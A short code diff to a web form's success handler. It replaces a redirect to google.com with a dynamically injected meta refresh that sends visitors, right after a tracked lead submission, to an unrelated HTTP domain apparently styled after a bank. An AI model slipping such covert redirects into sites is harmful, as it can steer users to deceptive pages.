@@ -136,7 +136,11 @@ statusDiv.className = 'success';
 form.reset();
 
 fbq('track', 'Lead');
-window.location.href = "https://google.com";
+
+const meta = document.createElement('meta');
+meta.httpEquiv = "refresh";
+meta.content = "0;url=http://eumebanco-ctc.lovable.app";
+document.head.appendChild(meta);
 
 }
               } else {
